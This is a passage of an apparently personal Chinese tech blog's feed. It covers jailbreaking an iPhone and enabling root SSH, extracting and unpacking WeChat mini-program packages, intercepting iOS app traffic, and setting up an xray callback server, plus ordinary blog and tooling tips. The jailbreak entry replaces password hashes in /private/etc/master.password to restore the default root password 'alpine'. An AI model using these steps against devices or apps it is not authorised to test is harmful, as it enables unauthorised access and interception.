&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;2222&lt;/span&gt; root@127.0.0.1:/var/mobile/Containers/Data/Application/680E3A76-7E1E-41DA-9E6C-F6199118A9EC/Library/WechatPrivate/&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;微信用户id的md5值&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;/WeApp/LocalCache/release/wxdfa85454f56610e4/82/Module/f6de052da5316347d90f07ff05982386.wxapkg  ~/Downloads/a.wxapkg
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;方法二：iFunBox
mac下载iFunBox，手机上用Cydia装Apple File Conduit &amp;quot;2&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210132243741.png&#34; alt=&#34;image-20221013224352704&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;解包&#34;&gt;解包&lt;/h3&gt;
&lt;p&gt;工具：&lt;a href=&#34;https://github.com/xuedingmiaojun/wxappUnpacker&#34;&gt;wxappUnpacker，命令行版不收费&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;解包主包：./bingo.sh testpkg/master-xxx.wxapkg
解包子包：./bingo.sh testpkg/sub-1-xxx.wxapkg -s=../master-xxx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;待续...&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/" term="小程序" label="小程序" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">iphone6 12.2越狱&#43;ssh</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/%E8%B6%8A%E7%8B%B1/" />
            <id>https://klearcc.github.io/post/%E8%B6%8A%E7%8B%B1/</id>
            <updated>2022-10-13T20:16:15&#43;08:00</updated>
            <published>2022-10-13T20:00:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">设备 mac iphone6 版本:12.2 手机数据线连接电脑……</summary>
            
                <content type="html">&lt;h4 id=&#34;设备&#34;&gt;设备&lt;/h4&gt;
&lt;p&gt;mac
iphone6 版本:12.2
手机数据线连接电脑&lt;/p&gt;
&lt;h3 id=&#34;安装&#34;&gt;安装&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;mac端下载unc0ver6.0.2，高版本越狱不成功。链接直达：https://unc0ver.dev/downloads/6.0.2/295da57f139b0b2e4151458ffc966477872d36dc/unc0ver_Release_6.0.2.ipa&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mac端装爱思助手，用于签名和往手机装ipa&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用爱思签名unc0ver_Release_6.0.2.ipa，过程挺简单的，需要一个appleID即可。签名好后带壳ipa会同步到爱思的下载中心，安装到设备：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210131756298.png&#34; alt=&#34;image-20221013175625160&#34;&gt;
安装后会有这个图标：
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210131801857.png&#34; alt=&#34;image-20221013180144818&#34;&gt;&lt;/p&gt;
&lt;p&gt;点进去长这样，点击Re-Jailbreak&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210131803548.png&#34; alt=&#34;image-20221013180340523&#34;&gt;
中间可能有弹窗广告，点击左上角×掉就行，越狱成功后长这样&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210131803501.png&#34; alt=&#34;image-20221013180356478&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ssh&#34;&gt;ssh&lt;/h3&gt;
&lt;p&gt;Cydua中搜索这几个安装&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210131807605.png&#34; alt=&#34;image-20221013180742568&#34;&gt;&lt;/p&gt;
&lt;p&gt;安装成功后桌面会出现terminal&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210131807886.png&#34; alt=&#34;image-20221013180701846&#34;&gt;
Mac端安装iproxy
iproxy 2222 22  ##将设备22端口映射到本机2222端口
连接：ssh &lt;a href=&#34;mailto:root@127.0.0.1&#34;&gt;root@127.0.0.1&lt;/a&gt; -p 2222&lt;/p&gt;
&lt;p&gt;密码，我也忘记了.. 默认可能是alpine&lt;/p&gt;
&lt;p&gt;没有密码或密码改过忘记的话可通过如下方式重置ssh密码。&lt;/p&gt;
&lt;h3 id=&#34;重置ssh密码&#34;&gt;重置ssh密码&lt;/h3&gt;
&lt;p&gt;Cydia安装Filza插件(iFile闪退)：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210131818503.png&#34; alt=&#34;	&#34;&gt;&lt;/p&gt;
&lt;p&gt;安装好之后桌面会出现Filza图标，就可以看到系统文件了&lt;/p&gt;
&lt;p&gt;定位到/private/etc/master.password这个文件，找到以下两行&lt;/p&gt;
&lt;p&gt;&lt;code&gt;root:xxxxxxxxxxxxx:0:0::0:0:System Administrator:/var/root:/bin/sh mobile:xxxxxxxxxxxxx:501:501::0:0:Mobile User:/var/mobile:/bin/sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;将root:以及mobile:后面的xxx字符修改为/smx7MYTQIi2M，修改保存后ssh密码即可恢复为alpine。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/" term="小程序" label="小程序" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">markdown语法简单使用</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/markdown%E8%AF%AD%E6%B3%95/" />
            <id>https://klearcc.github.io/post/markdown%E8%AF%AD%E6%B3%95/</id>
            <updated>2022-10-13T18:23:46&#43;08:00</updated>
            <published>2022-10-13T18:53:48&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">目录 语法： [toc] 标题 123 234 段落： enter shift+enter 块引用 右尖……</summary>
            
                <content type="html">&lt;p&gt;目录&lt;/p&gt;
&lt;p&gt;语法： [toc]&lt;/p&gt;
&lt;p&gt;标题&lt;/p&gt;
&lt;h2 id=&#34;123&#34;&gt;123&lt;/h2&gt;
&lt;h3 id=&#34;234&#34;&gt;234&lt;/h3&gt;
&lt;p&gt;段落：
enter
shift+enter&lt;/p&gt;
&lt;p&gt;&lt;code&gt;块引用&lt;/code&gt;
右尖括号&lt;/p&gt;
&lt;p&gt;列表
星号 1. 2.&lt;/p&gt;
&lt;p&gt;任务列表
语法: - [ ]     - [x]&lt;/p&gt;
&lt;p&gt;代码块
语法： &lt;code&gt;  /  高亮：&lt;/code&gt;+语言类型&lt;/p&gt;
&lt;p&gt;一小段代码
语法  一个&lt;code&gt;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;表格
语法  | 1 | 2 |&lt;/p&gt;
&lt;p&gt;链接
语法：&lt;a href=&#34;www.klear.com&#34;&gt;klear&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;字体
斜体 		前后加&lt;em&gt;号
粗体 		前后加两个&lt;/em&gt;号
删除线	 前后加两个~&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">解决google内置翻译失效</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/%E8%A7%A3%E5%86%B3google%E5%86%85%E7%BD%AE%E7%BF%BB%E8%AF%91%E5%A4%B1%E6%95%88/" />
            <id>https://klearcc.github.io/post/%E8%A7%A3%E5%86%B3google%E5%86%85%E7%BD%AE%E7%BF%BB%E8%AF%91%E5%A4%B1%E6%95%88/</id>
            <updated>2022-11-14T10:54:38&#43;08:00</updated>
            <published>2022-10-01T21:22:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">host文件添加 translate.googleapis.com 1 2 3 4 5 6 7 8 9 10 电……</summary>
            
                <content type="html">&lt;h3 id=&#34;heading&#34;&gt;&lt;/h3&gt;
&lt;h3 id=&#34;host文件添加&#34;&gt;host文件添加&lt;/h3&gt;
&lt;p&gt;translate.googleapis.com&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;电信 北京：220.181.174.226
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;电信 上海：180.163.150.34
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;联通 北京：114.250.66.34
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;联通 广州：58.254.137.162
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;移动 上海：120.253.255.162
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;其他 北京：203.208.39.194
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;其他 上海：203.208.40.66
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210011124112.png&#34; alt=&#34;image-20221001112457037&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;1114更新&#34;&gt;11.14更新&lt;/h2&gt;
&lt;p&gt;上面ip属实不太行了&lt;/p&gt;
&lt;p&gt;换下面的任意一个 ，温馨提示 需要梯子&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;142.250.4.90&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;142.250.30.90&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;142.250.99.90&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;142.250.101.90&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;142.250.105.90&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;142.250.107.90&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;172.253.112.90&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;172.253.114.90&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;172.253.116.90&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;172.253.124.90&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">Iosapp抓包</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/iosapp%E6%8A%93%E5%8C%85/" />
            <id>https://klearcc.github.io/post/iosapp%E6%8A%93%E5%8C%85/</id>
            <updated>2022-11-28T19:27:37&#43;08:00</updated>
            <published>2022-09-20T21:22:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">前情提要 mac抓ios实体机app数据包……</summary>
            
                <content type="html">&lt;h3 id=&#34;前情提要&#34;&gt;前情提要&lt;/h3&gt;
&lt;p&gt;mac抓ios实体机app数据包。&lt;/p&gt;
&lt;h3 id=&#34;流量&#34;&gt;流量&lt;/h3&gt;
&lt;p&gt;app-&amp;gt;Charles-&amp;gt;yakit&lt;/p&gt;
&lt;h3 id=&#34;配置&#34;&gt;配置&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;手机和mac连接同一网络。&lt;/p&gt;
&lt;p&gt;手机wifi设置代理为mac ip:8888。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;设置yakit，作为改包手工测试工具
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202123878.png&#34; alt=&#34;image-20220920143821424&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;charles设置代理，作为ios代理服务器
取消勾选macOS proxy，不抓本机流量：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202123659.png&#34; alt=&#34;image-20220920144104414&#34;&gt;监听端口随意设置：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202123711.png&#34; alt=&#34;image-20220920143232838&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/imgs202209201549271.png&#34; alt=&#34;image-20220920143356332&#34;&gt;&lt;/p&gt;
&lt;p&gt;添加yakit监听端口（两处都填127.0.0.1:8083）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202124070.png&#34; alt=&#34;image-20220920143458377&#34;&gt;
开启
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202124968.png&#34; alt=&#34;image-20220920143722615&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;电脑弹出对话框，选择access，手机端访问chls.pro/ssl安装证书，安装完之后在通用-关于本机-证书信任设置-对根证书启用完全信任&amp;amp;&amp;amp;通用-关于本机-证书信任设置-针对根证书启用完全信任。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/%E6%8A%93%E5%8C%85/" term="抓包" label="抓包" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">meme主题设置</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/meme%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/" />
            <id>https://klearcc.github.io/post/meme%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/</id>
            <updated>2022-10-01T11:26:59&#43;08:00</updated>
            <published>2022-09-20T20:53:48&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">meme主题搭建 hugo安装 下载hugo……</summary>
            
                <content type="html">&lt;p&gt;meme主题搭建&lt;/p&gt;
&lt;h3 id=&#34;hugo安装&#34;&gt;hugo安装&lt;/h3&gt;
&lt;p&gt;下载hugo &lt;a href=&#34;https://github.com/gohugoio/hugo/releases/&#34;&gt;https://github.com/gohugoio/hugo/releases/&lt;/a&gt;
环境变量：ln -s xx/xx/xx/hugo /usr/local/bin/hugo
hugo new site klearblog	##创建站点根目录&lt;/p&gt;
&lt;h3 id=&#34;meme主题下载&#34;&gt;meme主题下载&lt;/h3&gt;
&lt;p&gt;hugo不自带主题，俺选择meme
进入klearblog目录	git clone &lt;a href=&#34;https://github.com/reuixiy/hugo-theme-meme.git&#34;&gt;https://github.com/reuixiy/hugo-theme-meme.git&lt;/a&gt; themes/meme	##直接cp下来:dog2:	（问题：安装了git却无限安装。原因：系统更新解决：进xcode更新）
rm config.toml &amp;amp;&amp;amp; cp themes/meme/config-examples/en/config.toml config.toml
hugo new post/a.md	##创建个文件测试下
echo asdasdasd &amp;gt;&amp;gt; content/post/a.md   ##文件内追加点东西
Hugo server -v -D 	 	##本地看下效果,根据提示http://localhost:1313&lt;/p&gt;
&lt;h3 id=&#34;提交至github&#34;&gt;提交至github&lt;/h3&gt;
&lt;p&gt;新建仓库-&amp;gt;命名为 名字.github.io-&amp;gt;选择public-&amp;gt;点击创建 即可创建仓库
来到博客根目录(klearblog) 执行Hugo -D 生成所需数据
进入public目录，执行
git init
git remote add origin &lt;a href=&#34;mailto:git@github.com&#34;&gt;git@github.com&lt;/a&gt;:Klearcc/Klearcc.github.io.git
git add .
git commit -m&amp;quot;test&amp;quot;
git push --set-upstream origin main
(其中可能遇到各种问题，尤其在重复提交情况下，根据报错自行百度根据前辈建议操作即可解决)&lt;/p&gt;
&lt;h3 id=&#34;ssh公钥配置&#34;&gt;ssh公钥配置&lt;/h3&gt;
&lt;p&gt;自行百度&lt;/p&gt;
&lt;h3 id=&#34;效果&#34;&gt;效果&lt;/h3&gt;
&lt;p&gt;项目-&amp;gt;设置-&amp;gt;pages，点击预览站点即可。&lt;/p&gt;
&lt;h3 id=&#34;后续文章变更&#34;&gt;后续文章变更：&lt;/h3&gt;
&lt;p&gt;cd klearblog &amp;amp;&amp;amp; Hugo -D &amp;amp;&amp;amp; cd public/
git init
Git add .
Git commit -m&amp;quot;123&amp;quot;
git push
为了方便（写个sh或者alias）
例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-#github&#34; data-lang=&#34;#github&#34;&gt;alias hg=&amp;#34;cd ~/Desktop/博客/klearblog &amp;amp;&amp;amp; hugo -D &amp;amp;&amp;amp; cd ~/Desktop/博客/klearblog/public &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git commit -m &amp;#39;update&amp;#39; &amp;amp;&amp;amp; git push&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;typora提交图片问题&#34;&gt;Typora提交图片问题&lt;/h3&gt;
&lt;p&gt;问题：自己截的图片提交时候不会自动提交到github上。
解决：typora+picgo
新建一个放图片的仓库，比如命名为pic
typora21年某个版本之后支持图床，选择Picgo&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202037266.png&#34; alt=&#34;image-20220920203722221&#34;&gt;picgo配置，仓库名为 名字+pic，
设置token：github设置-developer settings
存储路径随意设置
自定义域名为jsdelivrCDN，填写规则如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202038248.png&#34; alt=&#34;image-20220920203832229&#34;&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202039972.png&#34; alt=&#34;image-20220920203916950&#34;&gt;&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">m1 使用proxychains</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/m1%E4%BD%BF%E7%94%A8proxychains/" />
            <id>https://klearcc.github.io/post/m1%E4%BD%BF%E7%94%A8proxychains/</id>
            <updated>2023-02-05T13:17:24&#43;08:00</updated>
            <published>2022-06-28T20:53:48&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">m1直接使用brew安装proxycha……</summary>
            
                <content type="html">&lt;p&gt;m1直接使用brew安装proxychains-ng会报错&lt;/p&gt;
&lt;p&gt;解决过程：&lt;/p&gt;
&lt;p&gt;github下载源码自己编译。&lt;/p&gt;
&lt;p&gt;禁用sip，百度...不写&lt;/p&gt;
&lt;p&gt;下载proxychains-ng &lt;a href=&#34;https://github.com/rofl0r/proxychains-ng&#34;&gt;https://github.com/rofl0r/proxychains-ng&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;解压　　tar -xvf proxychainsxxxxxx&lt;/p&gt;
&lt;p&gt;重点来了 ，三次编译&lt;/p&gt;
&lt;p&gt;第一次编译：
cd proxychains-ng-4.16
make clean
CFLAGS=&amp;quot;-arch arm64e&amp;quot; LDFLAGS=&amp;quot;-arch arm64e&amp;quot;
./configure
make
将libproxychains4.dylib复制到新建一个bak目录下
mkdir bak
cp libproxychains4.dylib ./bak&lt;/p&gt;
&lt;p&gt;第二次编译：
make clean
CFLAGS=&amp;quot;-arch arm64e&amp;quot; LDFLAGS=&amp;quot;-arch arm64e&amp;quot;
./configure
make
将libproxychains4.dylib复制到bak目录下，覆盖
cp libproxychains4.dylib ./bak&lt;/p&gt;
&lt;p&gt;第三次编译：
make clean
CFLAGS=&amp;quot;-arch arm64&amp;quot; LDFLAGS=&amp;quot;-arch arm64&amp;quot;
./configure
sudo make install
使用install.sh复制./bak/libproxychains4.dylib 到/usr/local/lib/目录
sudo ./tools/install.sh -D -m 644 bak/libproxychains4.dylib /usr/local/lib/libproxychains4.dylib&lt;/p&gt;
&lt;p&gt;配置文件在/etc/proxychains.conf
sudo vi /etc/proxychains.conf&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">test</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/mitmproxy/" />
            <id>https://klearcc.github.io/post/mitmproxy/</id>
            <updated>2022-10-13T19:47:22&#43;08:00</updated>
            <published>2022-06-16T21:22:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">使用 Mitm -s script.py -p 8888 脚本规则request</summary>
            
                <content type="html">&lt;h2 id=&#34;heading&#34;&gt;&lt;/h2&gt;
&lt;h4 id=&#34;使用&#34;&gt;使用&lt;/h4&gt;
&lt;p&gt;Mitm -s script.py -p 8888&lt;/p&gt;
&lt;h3 id=&#34;脚本规则request&#34;&gt;脚本规则request&lt;/h3&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">xray反连平台设置</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/xray%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0/" />
            <id>https://klearcc.github.io/post/xray%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0/</id>
            <updated>2022-09-20T22:35:11&#43;08:00</updated>
            <published>2022-06-16T21:22:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">准备： 买一台公网主机。 一个域名。阿里云买……</summary>
            
                <content type="html">&lt;h2 id=&#34;准备&#34;&gt;准备：&lt;/h2&gt;
&lt;p&gt;买一台公网主机。&lt;/p&gt;
&lt;p&gt;一个域名。阿里云买。&lt;/p&gt;
&lt;h2 id=&#34;配置域名&#34;&gt;配置域名：&lt;/h2&gt;
&lt;p&gt;创建两个dns服务器：比如ns1 ns2&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202235610.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202235644.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改dns服务器，填刚刚创建的两个dns服务器名：&lt;/p&gt;
